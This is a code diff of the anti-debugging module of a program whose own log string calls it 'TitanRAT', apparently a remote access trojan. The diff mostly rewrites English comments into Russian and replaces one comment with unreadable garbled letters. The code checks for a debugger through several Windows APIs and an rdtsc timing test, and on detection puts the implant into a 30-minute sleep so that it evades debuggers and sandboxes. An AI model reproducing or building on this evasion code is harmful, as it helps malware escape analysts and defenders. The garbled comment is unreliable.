@@ -1,4 +1,3 @@
-// Core/anti_debug.cpp
 #include "anti_debug.h"
 #include <windows.h>
 #include <winternl.h>
@@ -7,7 +6,7 @@
 volatile bool g_sleepMode = false;
 static bool g_timeoutThreadStarted = false;
 
-// Dynamic load of NtQueryInformationProcess
+// Lbyfvbxtcrfz pfuheprf NtQueryInformationProcess
 typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
     HANDLE ProcessHandle,
     ULONG ProcessInformationClass,
@@ -16,7 +15,7 @@ typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
     PULONG ReturnLength
 );
 
-// rdtsc-based timing check: if small loop takes >5000 cycles, likely debugger
+// Проверка тактов процессора
 static bool rdtsc_check() {
     UINT64 t1, t2;
     volatile UINT64 dummy = 0;
@@ -30,7 +29,7 @@ static bool rdtsc_check() {
     return ((t2 - t1) > 5000);
 }
 
-// Timeout thread: exit sleep mode after 30 minutes
+// Функция-поток спящего режима
 static DWORD WINAPI sleepTimeout(LPVOID) {
     Sleep(30 * 60 * 1000); // 30 minutes
     g_sleepMode = false;
@@ -38,7 +37,7 @@ static DWORD WINAPI sleepTimeout(LPVOID) {
     return 0;
 }
 
-// Start timeout thread (one-shot)
+// Запуск потока таймаута
 static void start_sleep_timeout() {
     if (!g_timeoutThreadStarted) {
         g_timeoutThreadStarted = true;
@@ -47,13 +46,14 @@ static void start_sleep_timeout() {
     }
 }
 
+//Проверка на дебаггер (основная функция, вызывается мейном)
 void check_debugger() {
     BOOL isDebuggerPresent = IsDebuggerPresent();
     
     BOOL isRemoteDebugger = FALSE;
     CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger);
     
-    // Dynamic NtQueryInformationProcess for ProcessDebugPort
+    // Динамическая NtQueryInformationProcess для процесс дебаг порт
     bool debugPortDetected = false;
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (hNtdll) {
@@ -68,7 +68,7 @@ void check_debugger() {
                 sizeof(debugPort),
                 NULL
             );
-            // If status == 0 and debugPort != 0, debugger is attached
+            // Если функция успешна и порт обнаружен, то отладчик подключён
             if (NT_SUCCESS(status) && debugPort != 0) {
                 debugPortDetected = true;
             }
@@ -77,6 +77,7 @@ void check_debugger() {
     
     bool timingAnomaly = rdtsc_check();
     
+    //Финальная проверка
     if (isDebuggerPresent || isRemoteDebugger || debugPortDetected || timingAnomaly) {
         OutputDebugStringA("[TitanRAT] Debugger/sandbox detected, entering sleep mode\n");
         g_sleepMode = true;
